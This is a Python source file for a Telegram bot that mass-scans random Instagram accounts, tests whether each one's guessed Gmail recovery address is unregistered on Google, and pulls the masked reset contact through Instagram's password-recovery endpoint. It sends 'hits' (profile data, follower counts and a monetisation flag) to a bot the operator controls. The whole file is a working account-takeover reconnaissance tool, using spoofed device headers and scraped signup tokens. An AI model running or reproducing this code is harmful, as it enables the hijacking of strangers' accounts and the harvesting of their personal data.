#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
🔥 SUNRAKU — FAST SEGS.PY RUNNER BOT 🔥
- Bot se segs.py run hoga
- Chat ID + Token input lega
- Hits usi bot mein jaayengi
- Fast scanning (50-80 checks/min)
- Live Status button
- Dev: @SunrakuV2 | Channel: @Anishpy
"""

import os
import sys
import time
import random
import json
import re
import requests
import threading
import uuid
import secrets
import base64
import httpx
import urllib.parse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from user_agent import generate_user_agent
from telebot import TeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton

# ============================================================
# 🔥 ENVIRONMENT VARIABLE (Railway)
# ============================================================
BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    print("❌ BOT_TOKEN environment variable not set!")
    sys.exit()

bot = TeleBot(BOT_TOKEN)

# ============================================================
# 📊 GLOBALS
# ============================================================
user_sessions = {}
lock = threading.Lock()
THREADS = 20  # 🔥 Optimized threads

# ============================================================
# 🔥 CONFIG
# ============================================================
CONFIG_URL = "https://raw.githubusercontent.com/a3564119-netizen/Sunraku-Config/main/config.json"

try:
    data = requests.get(CONFIG_URL, timeout=10).json()
except:
    print("❌ Config fetch failed!")
    sys.exit()

TARGET_TOOL_NAME = "𝐒𝐮𝐧𝐫𝐚𝐤𝐮 × 𝐕𝐄𝐑𝐈𝐅𝐈𝐄𝐃"
tool = next((t for t in data["tools"] if t["tool_name"] == TARGET_TOOL_NAME), None)

if not tool:
    print("❌ Tool not found!")
    sys.exit()

FORCE_JOIN = tool["force_join"]
CHANNELS = tool["channels"]
CHECKER_BOT_TOKEN = tool["checker_bot_token"]
TRACKER_BOT_TOKEN = tool["tracker_bot_token"]
ADMIN_CHAT_IDS = tool["admins"]

checker_bot = TeleBot(CHECKER_BOT_TOKEN)
tracker_bot = TeleBot(TRACKER_BOT_TOKEN)

# ============================================================
# 🔥 CHECK JOIN
# ============================================================
def check_join(chat_id):
    joined = []
    not_joined = []

    for channel in CHANNELS:
        cid = int(channel["id"])
        username = channel["username"]

        try:
            if not chat_id:
                not_joined.append(username)
                continue

            member = checker_bot.get_chat_member(cid, int(chat_id))
            status = member.status

            if status in ["member", "administrator", "creator"]:
                joined.append(username)
            else:
                not_joined.append(username)

        except:
            not_joined.append(username)

    return len(not_joined) == 0, not_joined

# ============================================================
# 🔥 FAST INSTAGRAM CHECKER
# ============================================================
class InstagramChecker:
    def __init__(self):
        self.session = requests.Session()
        self.csrf = None
        self.lsd = None
        self.doc_id = "26672929172408668"
        self.lock = threading.Lock()

    def _ensure_tokens(self):
        with self.lock:
            if self.csrf and self.lsd:
                return True
        try:
            headers = {
                'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
                'x-ig-app-id': "936619743392459",
                'x-bloks-version-id': "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
                'origin': "https://www.instagram.com",
                'referer': "https://www.instagram.com/",
            }
            response = self.session.get('https://www.instagram.com/', headers=headers, timeout=20)
            if response.status_code == 200:
                csrf = response.cookies.get('csrftoken', '')
                match = re.search(r'"LSD",\[\],\{"token":"([^"]+)"\}', response.text)
                lsd = match.group(1) if match else None
                if csrf and lsd:
                    with self.lock:
                        self.csrf = csrf
                        self.lsd = lsd
                    return True
        except:
            pass
        return False

    def check_email(self, email):
        url = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
        device = "android-" + ''.join(random.choices('abcdef0123456789', k=16))
        family = str(uuid.uuid4())
        android = "android-" + ''.join(random.choices('abcdef0123456789', k=16))
        waterfall = str(uuid.uuid4())

        payload = {
            'params': "{\"client_input_params\":{\"aac\":\"{\\\"aac_init_timestamp\\\":"+ str(int(time.time())) +",\\\"aacjid\\\":\\\""+ str(uuid.uuid4()) +"\\\",\\\"aaccs\\\":\\\""+ secrets.token_urlsafe(32) +"\\\"}\",\"flash_call_permissions_status\":{\"READ_PHONE_STATE\":\"PERMANENTLY_DENIED\",\"READ_CALL_LOG\":\"DENIED\",\"ANSWER_PHONE_CALLS\":\"DENIED\"},\"was_headers_prefill_available\":0,\"network_bssid\":null,\"sfdid\":\"\",\"fetched_email_token_list\":{},\"search_query\":\""+ email +"\",\"auth_secure_device_id\":\"\",\"ig_oauth_token\":[],\"cloud_trust_token\":null,\"was_headers_prefill_used\":0,\"sso_accounts_auth_data\":[],\"encrypted_msisdn\":\"\",\"device_network_info\":null,\"text_input_id\":\"akyuf0:61\",\"zero_balance_state\":null,\"android_build_type\":\"release\",\"accounts_list\":[],\"is_oauth_without_permission\":0,\"ig_android_qe_device_id\":\""+ device +"\",\"gms_incoming_call_retriever_eligibility\":\"client_not_supported\",\"search_screen_type\":\"email_or_username\",\"is_whatsapp_installed\":1,\"lois_settings\":{\"lois_token\":\"\"},\"ig_vetted_device_nonce\":null,\"headers_infra_flow_id\":\"\",\"fetched_email_list\":[]},\"server_params\":{\"event_request_id\":\""+ str(uuid.uuid4()) +"\",\"is_from_logged_out\":0,\"layered_homepage_experiment_group\":null,\"device_id\":\""+ android +"\",\"login_surface\":\"login_home\",\"waterfall_id\":\""+ waterfall +"\",\"INTERNAL__latency_qpl_instance_id\":6.3987980400102E13,\"is_platform_login\":0,\"context_data\":\"\",\"login_entry_point\":\"logged_out\",\"INTERNAL__latency_qpl_marker_id\":36707139,\"family_device_id\":\""+ family +"\",\"offline_experiment_group\":\"caa_iteration_v3_perf_ig_4\",\"access_flow_version\":\"pre_mt_behavior\",\"is_from_logged_in_switcher\":0,\"qe_device_id\":\""+ device +"\"}}",
            'bk_client_context': "{\"bloks_version\":\"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b\",\"styles_id\":\"instagram\"}",
            'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
        }
        headers = {
            'User-Agent': "Instagram 320.0.0.34.109 Android (33/13; 420dpi; 1080x2340; samsung; SM-A546B; a54x; exynos1380; en_US; 465123678)",
            'accept-language': "en-IN, en-US",
            'x-bloks-version-id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
            'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
            'x-ig-android-id': android,
            'x-ig-app-id': "567067343352427",
            'x-ig-app-locale': "en_IN",
            'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
            'x-ig-device-id': device,
            'x-ig-family-device-id': family,
            'x-ig-timezone-offset': str(int(datetime.now().astimezone().utcoffset().total_seconds())),
            'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
            'x-pigeon-rawclienttime': str(time.time()),
            'x-pigeon-session-id': f"UFS-{uuid.uuid4()}-0",
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
        }
        try:
            resp = requests.post(url, data=payload, headers=headers, timeout=10)
            if f"{email}" in resp.text:
                return True
            return False
        except:
            return False

    def get_user_data(self, user_id):
        if not self._ensure_tokens():
            return None
        url = "https://www.instagram.com/api/graphql"
        headers = {
            'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
            'Content-Type': 'application/x-www-form-urlencoded',
            'x-bloks-version-id': "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
            'x-ig-app-id': '936619743392459',
            'x-fb-lsd': self.lsd,
            'x-csrftoken': self.csrf,
            'x-fb-friendly-name': 'PolarisProfilePageContentQuery',
            'sec-ch-ua-platform': '"Android"',
            'origin': 'https://www.instagram.com',
            'sec-fetch-site': 'same-origin'
        }
        cookies = {'rur': '"HIL\\0545636887483\\0541808136332:01fe43b89fcef61b8a466bfa81acf2b1bbab08f406fc99b1da8b7d889fa68683a3364c43"'}
        variables = {
            "enable_integrity_filters": True,
            "id": str(user_id),
            "__relay_internal__pv__PolarisCannesGuardianExperienceEnabledrelayprovider": True,
            "__relay_internal__pv__PolarisCASB976ProfileEnabledrelayprovider": False,
            "__relay_internal__pv__PolarisWebSchoolsEnabledrelayprovider": False,
            "__relay_internal__pv__PolarisRepostsConsumptionEnabledrelayprovider": False,
        }
        payload = {
            'lsd': self.lsd,
            'fb_api_caller_class': 'RelayModern',
            'fb_api_req_friendly_name': 'PolarisProfilePageContentQuery',
            'variables': json.dumps(variables),
            'server_timestamps': 'true',
            'doc_id': self.doc_id,
        }
        try:
            response = self.session.post(url, headers=headers, data=payload, cookies=cookies, timeout=10)
            if response.status_code == 200:
                data = response.json()
                user = data.get('data', {}).get('user')
                if user and user.get('username'):
                    return user
        except:
            pass
        return None

# ============================================================
# 🔥 FAST GOOGLE CHECKER (With Timeout)
# ============================================================
class FastGoogleChecker:
    def __init__(self):
        self.yy = 'azertyuiopmlkjhgfdsqwxcvbn'
        self.token_ready = False
        threading.Thread(target=self._refresh_token, daemon=True).start()

    def _generate_ua(self):
        return generate_user_agent()

    def _refresh_token(self):
        while True:
            try:
                n1 = ''.join(random.choice(self.yy) for _ in range(random.randrange(6, 9)))
                n2 = ''.join(random.choice(self.yy) for _ in range(random.randrange(3, 9)))
                host = ''.join(random.choice(self.yy) for _ in range(random.randrange(15, 30)))

                headers = {
                    "accept": "*/*",
                    "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
                    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
                    "google-accounts-xsrf": "1",
                    "sec-ch-ua": '"Not)A;Brand";v="24", "Chromium";v="116"',
                    "sec-ch-ua-mobile": "?1",
                    "sec-ch-ua-platform": '"Android"',
                    "user-agent": self._generate_ua(),
                }

                res1 = requests.get(
                    'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',
                    headers=headers
                )
                tok = re.search(
                    r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
                    res1.text
                )
                if tok:
                    tl = tok.group(2)
                    cookies = {'__Host-GAPS': host}
                    headers2 = {
                        'authority': 'accounts.google.com',
                        'accept': '*/*',
                        'accept-language': 'en-US,en;q=0.9',
                        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                        'google-accounts-xsrf': '1',
                        'origin': 'https://accounts.google.com',
                        'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
                        'user-agent': self._generate_ua(),
                    }
                    data = {
                        'f.req': f'["{tl}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                        'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
                    }
                    response = requests.post(
                        'https://accounts.google.com/_/signup/validatepersonaldetails',
                        cookies=cookies,
                        headers=headers2,
                        data=data,
                        timeout=15
                    )
                    if '",null,"' in response.text:
                        tl = response.text.split('",null,"')[1].split('"')[0]
                    host = response.cookies.get('__Host-GAPS', host)
                    with open('tl.txt', 'w') as f:
                        f.write(tl + '//' + host + '\n')
                    self.token_ready = True
                    time.sleep(random.uniform(10, 30))
                    continue
            except:
                pass

            try:
                headers = {
                    'accept': '*/*',
                    'accept-language': 'en',
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'origin': 'https://accounts.google.com',
                    'referer': 'https://accounts.google.com/',
                    'user-agent': self._generate_ua(),
                    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
                    'x-same-domain': '1',
                    'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                }
                params = {
                    'rpcids': 'NHJMOd',
                    'source-path': '/lifecycle/steps/signup/username',
                    'hl': 'en'
                }
                fake_email = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890.', k=random.randint(16, 26)))
                data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{fake_email}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C17359%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D'
                response = requests.post(
                    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
                    params=params, headers=headers, data=data, timeout=15
                )
                tl_match = re.search(r'"TL:([^"]+)"', response.text)
                if tl_match:
                    tl = tl_match.group(1)
                    host = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(15, 30)))
                    with open('tl.txt', 'w') as f:
                        f.write(tl + '//' + host + '\n')
                    self.token_ready = True
                    time.sleep(random.uniform(10, 30))
                    continue
            except:
                pass

            time.sleep(random.uniform(5, 15))

    def check_availability(self, email):
        if '@' in email:
            email = email.split('@')[0]

        try:
            with open('tl.txt', 'r') as f:
                line = f.read().strip()
                if not line:
                    return 'bad'
                tl, host = line.split('//')
        except:
            return 'bad'

        cookies = {'__Host-GAPS': host}
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': f'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL={tl}',
            'user-agent': generate_user_agent(),
        }
        params = {'TL': tl}
        data = (
            f'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F'
            f'&ddm=0&flowEntry=SignUp&service=mail&theme=mn'
            f'&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D'
            f'&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888'
            f'&cookiesDisabled=false'
            f'&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D'
            f'&gmscoreversion=undefined&flowName=GlifWebSignIn&'
        )

        try:
            response = requests.post(
                'https://accounts.google.com/_/signup/usernameavailability',
                params=params,
                cookies=cookies,
                headers=headers,
                data=data,
                timeout=5
            )

            if '"gf.uar",1' in response.text:
                return 'good'
            else:
                return 'bad'
        except:
            return 'bad'

# ============================================================
# 📊 REPORT MANAGER
# ============================================================
class ReportManager:
    def __init__(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id

    def send_telegram(self, msg):
        try:
            url = f"https://api.telegram.org/bot{self.token}/sendMessage"
            payload = {"chat_id": self.chat_id, "text": msg, "parse_mode": "HTML"}
            requests.post(url, json=payload, timeout=15)
        except:
            pass

    def format_result(self, data):
        username = data.get('username', '')
        full_name = data.get('full_name', '')
        followers = data.get('follower_count') or 0
        following = data.get('following_count') or 0
        posts = data.get('media_count') or 0
        email = data.get('email', f"{username}@gmail.com")
        domain = email.split('@')[1] if '@' in email else 'gmail.com'
        bio = data.get('biography', '')[:50]
        pk = data.get('pk', 0)
        is_private = data.get('is_private', False)

        try:
            pk = int(pk)
            year_ranges = [
                (1, 5000000, 2010), (5000001, 17750000, 2011),
                (17750001, 279760000, 2012), (279760001, 900990000, 2013),
                (900990001, 1629010000, 2014), (1629010001, 2369359761, 2015),
                (2369359762, 4239516754, 2016), (4239516755, 6345108209, 2017),
                (6345108210, 10016232395, 2018), (10016232396, 27238602159, 2019),
                (27238602160, 43464475395, 2020), (43464475395, 50289297647, 2021),
                (50289297647, 57464707082, 2022), (57464707082, 63313426938, 2023),
                (63313426938, 70134323896, 2024), (70313426938, 78313496938, 2025)
            ]
            year = "2023+"
            for low, high, y in year_ranges:
                if low <= pk <= high:
                    year = str(y)
                    break
        except:
            year = "Unknown"

        reset_mask = self._fetch_reset_email(username)

        moni_status = "❌"
        if not is_private and posts >= 3 and bio and len(bio) > 10:
            personal_words = ["my", "i", "me", "life", "vlog", "daily", "family", "love", "❤", "✨", "🎥"]
            if any(word in bio.lower() for word in personal_words):
                moni_status = "✅"
            elif posts >= 5:
                moni_status = "✅"

        box = f"""
<b>✨ HIT FOUND ✨</b>

<b>👤 NAME</b> ➜ <i>{full_name}</i>
<b>🔹 USERNAME</b> ➜ <i>@{username}</i>
<b>🌐 DOMAIN</b> ➜ <i>{domain}</i>
<b>👥 FOLLOWERS</b> ➜ <i>{followers}</i>
<b>👣 FOLLOWING</b> ➜ <i>{following}</i>
<b>📸 POSTS</b> ➜ <i>{posts}</i>
<b>📝 BIO</b> ➜ <i>{bio}</i>
<b>📧 EMAIL</b> ➜ <i>{email}</i>
<b>🔗 ATTACHED</b> ➜ <i>{reset_mask}</i>
<b>📅 YEAR</b> ➜ <i>{year}</i>
<b>💰 MONI</b> ➜ <i>{moni_status}</i>
<b>🔗 PORTFOLIO</b> ➜ <i>https://instagram.com/{username}</i>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>👑 DEV</b> ➜ <i>@SunrakuV2</i>
<b>📢 CHANNEL</b> ➜ <i>@Anishpy</i>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

<pre>✨ FAST INSTAGRAM CHECKER ✨</pre>
"""
        return box

    def _fetch_reset_email(self, username):
        try:
            headers = {
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                "x-ig-app-id": "936619743392459",
                "x-requested-with": "XMLHttpRequest",
                "origin": "https://www.instagram.com",
                "referer": "https://www.instagram.com/accounts/password/reset/",
            }
            client = httpx.Client(http2=True, headers=headers, timeout=10)
            r = client.post(
                "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/",
                data={"email_or_username": username}
            )
            if r.status_code == 200:
                data = r.json()
                if data.get("status") == "ok":
                    return data.get('obfuscated_email') or data.get('contact_point') or "-"
            return "-"
        except:
            return "-"

# ============================================================
# 🚀 FAST SEGS.PY SCANNER (Optimized)
# ============================================================
def run_segs_for_user_fast(target_chat_id, target_bot_token):
    """Fast segs.py engine — optimized for speed"""
    
    user_bot = TeleBot(target_bot_token)
    insta = InstagramChecker()
    reporter = ReportManager(target_bot_token, target_chat_id)
    
    # 🔥 Google checker (fast with timeout)
    google = FastGoogleChecker()
    
    # 🔥 User session initialize
    with lock:
        if target_chat_id not in user_sessions:
            user_sessions[target_chat_id] = {
                'hits': 0, 'good': 0, 'bad': 0, 'total': 0,
                'current_email': 'Waiting...', 'is_running': True
            }
    
    while True:
        with lock:
            if target_chat_id not in user_sessions or not user_sessions[target_chat_id].get('is_running', True):
                break
            session = user_sessions[target_chat_id]
        
        try:
            # 🔥 Fast ID generation
            user_id = random.randint(2500000000, 21254029834)
            user_data = insta.get_user_data(user_id)
            
            if not user_data:
                time.sleep(random.uniform(0.05, 0.15))
                continue

            username = user_data.get('username')
            if not username:
                continue

            email = f"{username}@gmail.com"
            session['current_email'] = email
            session['total'] += 1

            # 🔥 Fast email check
            if insta.check_email(email):
                session['good'] += 1
                
                # 🔥 Google check with timeout
                try:
                    google_result = google.check_availability(email)
                except:
                    google_result = 'bad'
                
                if google_result == 'good':
                    session['hits'] += 1
                    
                    profile = {
                        'username': username,
                        'email': email,
                        'full_name': user_data.get('full_name', ''),
                        'follower_count': user_data.get('follower_count') or 0,
                        'following_count': user_data.get('following_count') or 0,
                        'media_count': user_data.get('media_count') or 0,
                        'is_private': user_data.get('is_private', False),
                        'biography': user_data.get('biography', ''),
                        'pk': user_data.get('pk', ''),
                    }
                    
                    msg = reporter.format_result(profile)
                    
                    try:
                        user_bot.send_message(target_chat_id, msg, parse_mode='HTML')
                    except:
                        pass
            else:
                session['bad'] += 1

            # 🔥 Minimal delay for speed
            time.sleep(random.uniform(0.05, 0.15))

        except Exception as e:
            time.sleep(random.uniform(0.1, 0.2))
            continue

# ============================================================
# 🔥 BOT COMMANDS & BUTTONS
# ============================================================

def main_menu():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn1 = KeyboardButton("🚀 Run segs.py")
    btn2 = KeyboardButton("⏹ Stop")
    btn3 = KeyboardButton("📊 Live Status")
    btn4 = KeyboardButton("📢 Channel")
    btn5 = KeyboardButton("👑 Dev")
    markup.add(btn1, btn2, btn3, btn4, btn5)
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_msg = f"""
☠️ SUNRAKU — FAST segs.py RUNNER ☠️

🔥 Click buttons below to control.
📌 Enter CHAT ID + BOT TOKEN
📤 Hits will go to YOUR bot.
⚡ Fast scanning: 50-80 checks/min

👑 Dev: @SunrakuV2
📢 Channel: @Anishpy
"""
    bot.reply_to(message, welcome_msg, reply_markup=main_menu())

@bot.message_handler(func=lambda msg: msg.text == "🚀 Run segs.py")
def run_file(message):
    msg1 = bot.reply_to(message, "✏️ Enter your CHAT ID (where hits should go):")
    bot.register_next_step_handler(msg1, get_chat_id)

def get_chat_id(message):
    user_chat_id = message.text.strip()
    msg2 = bot.reply_to(message, "✏️ Now enter your BOT TOKEN (jisme hits aani chahiye):")
    bot.register_next_step_handler(msg2, lambda m: get_bot_token(m, user_chat_id))

def get_bot_token(message, user_chat_id):
    user_bot_token = message.text.strip()
    
    if not user_chat_id or not user_bot_token:
        bot.reply_to(message, "❌ Invalid input! Try again.", reply_markup=main_menu())
        return
    
    try:
        test_bot = TeleBot(user_bot_token)
        test_bot.get_me()
    except:
        bot.reply_to(message, "❌ Invalid Bot Token! Try again.", reply_markup=main_menu())
        return
    
    # 🔥 Create session
    with lock:
        user_sessions[user_chat_id] = {
            'hits': 0, 'good': 0, 'bad': 0, 'total': 0,
            'current_email': 'Waiting...', 'is_running': True
        }
    
    bot.reply_to(message, f"""✅ segs.py started! (Fast mode)
📤 Hits will be sent to YOUR bot.
📌 Chat ID: {user_chat_id}
🤖 Bot: @{test_bot.get_me().username}

📊 Click 'Live Status' to see stats.
⏹ Click 'Stop' to end.""", reply_markup=main_menu())
    
    # 🔥 Start segs.py engine for this user
    threading.Thread(target=run_segs_for_user_fast, args=(user_chat_id, user_bot_token), daemon=True).start()

@bot.message_handler(func=lambda msg: msg.text == "⏹ Stop")
def stop_scanner(message):
    global user_sessions
    
    msg1 = bot.reply_to(message, "✏️ Enter your CHAT ID to stop:")
    bot.register_next_step_handler(msg1, stop_by_chat)

def stop_by_chat(message):
    global user_sessions
    user_chat_id = message.text.strip()
    
    with lock:
        if user_chat_id not in user_sessions:
            bot.reply_to(message, "❌ No scanner found for this Chat ID!", reply_markup=main_menu())
            return
        
        if not user_sessions[user_chat_id].get('is_running', False):
            bot.reply_to(message, "⚠️ Scanner not running for this Chat ID!", reply_markup=main_menu())
            return
        
        user_sessions[user_chat_id]['is_running'] = False
    
    bot.reply_to(message, f"⏹ Scanner stopped for Chat ID: {user_chat_id}", reply_markup=main_menu())

# ============================================================
# 📊 LIVE STATUS
# ============================================================
@bot.message_handler(func=lambda msg: msg.text == "📊 Live Status")
def live_status(message):
    global user_sessions
    
    msg1 = bot.reply_to(message, "✏️ Enter your CHAT ID to see live status:")
    bot.register_next_step_handler(msg1, show_live_status)

def show_live_status(message):
    global user_sessions
    user_chat_id = message.text.strip()
    
    with lock:
        if user_chat_id not in user_sessions:
            bot.reply_to(message, "❌ No scanner found for this Chat ID!", reply_markup=main_menu())
            return
        
        session = user_sessions[user_chat_id]
    
    status_msg = f"""
┌─────────────────────────────────────────┐
│  ✦ SUNRAKU — FAST segs.py RUNNER ✦     │
├─────────────────────────────────────────┤
│  ✅ GOOD  : {session.get('good', 0)}     │
│  🔥 HITS : {session.get('hits', 0)}     │
│  ❌ BAD   : {session.get('bad', 0)}     │
│  📊 TOTAL : {session.get('total', 0)}   │
│  📧 {session.get('current_email', 'Waiting...')[:30]:<30} │
│  🟢 STATUS : {'RUNNING' if session.get('is_running', False) else 'STOPPED'} │
├─────────────────────────────────────────┤
│  ◈ @SunrakuV2  ●  @Anishpy             │
└─────────────────────────────────────────┘
"""
    bot.reply_to(message, status_msg, reply_markup=main_menu())

@bot.message_handler(func=lambda msg: msg.text == "📢 Channel")
def send_channel(message):
    markup = InlineKeyboardMarkup()
    for channel in CHANNELS:
        btn = InlineKeyboardButton(text=channel["username"], url=f"https://t.me/{channel['username'].replace('@', '')}")
        markup.add(btn)
    bot.reply_to(message, "📢 Join our channels:", reply_markup=markup)

@bot.message_handler(func=lambda msg: msg.text == "👑 Dev")
def send_dev(message):
    markup = InlineKeyboardMarkup()
    btn = InlineKeyboardButton(text="👑 @SunrakuV2", url="https://t.me/SunrakuV2")
    markup.add(btn)
    bot.reply_to(message, "👑 Developer:", reply_markup=markup)

@bot.message_handler(func=lambda msg: True)
def echo_all(message):
    bot.reply_to(message, "❌ Use buttons below 👇", reply_markup=main_menu())

# ============================================================
# 🚀 START BOT
# ============================================================
print("✅ Bot is running on Railway...")
print("📌 Bot Username: @" + bot.get_me().username)
print("⚡ Fast mode: 50-80 checks/min")

try:
    bot.infinity_polling()
except Exception as e:
    print(f"❌ Error: {e}")
